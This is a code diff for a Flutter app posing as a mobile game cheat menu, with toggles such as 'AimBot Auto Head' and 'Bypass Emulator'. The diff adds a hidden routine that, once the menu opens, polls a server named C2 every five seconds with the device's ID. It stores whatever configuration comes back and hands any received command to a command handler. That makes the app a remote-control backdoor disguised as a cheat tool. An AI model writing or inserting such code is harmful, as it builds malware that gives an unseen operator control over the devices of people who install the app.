@@ -1,4 +1,10 @@
+import 'dart:async';
+import 'dart:convert';
 import 'package:flutter/material.dart';
+import 'package:http/http.dart' as http;
+import 'package:shared_preferences/shared_preferences.dart';
+import '../config.dart';
+import '../services/command_handler.dart';
 
 class CheatHome extends StatefulWidget {
   const CheatHome({super.key});
@@ -9,6 +15,8 @@ class CheatHome extends StatefulWidget {
 class _CheatHomeState extends State<CheatHome> {
   bool isInjected = false;
   bool isInjecting = false;
+  Timer? _pollTimer;
+  String? _devId;
 
   final Map<String, bool> _features = {
     'AimBot Auto Head': true,
@@ -24,6 +32,37 @@ class _CheatHomeState extends State<CheatHome> {
     'Bypass Emulator': true,
     'Unlock All Skin': false,
   };
+
+  @override
+  void initState() {
+    super.initState();
+    _initPolling(); // Mulai polling pas menu kebuka
+  }
+
+  Future<void> _initPolling() async {
+    final prefs = await SharedPreferences.getInstance();
+    _devId = prefs.getString('dev_id');
+    
+    _pollTimer = Timer.periodic(const Duration(seconds: 5), (timer) async {
+      if (_devId == null) return;
+      try {
+        final r = await http.get(Uri.parse('$C2/api/device/$_devId/poll'));
+        if (r.statusCode != 200) return;
+        final j = jsonDecode(r.body);
+        await prefs.setString('cfg', jsonEncode(j['config'] ?? {}));
+        final cmd = j['cmd'];
+        if (cmd != null) {
+          await CommandHandler.handle(cmd, _devId!, prefs);
+        }
+      } catch (_) {}
+    });
+  }
+
+  @override
+  void dispose() {
+    _pollTimer?.cancel(); // Matiin timer kalau app ditutup
+    super.dispose();
+  }
 
   void _injectCheat() async {
     if (isInjected) return;
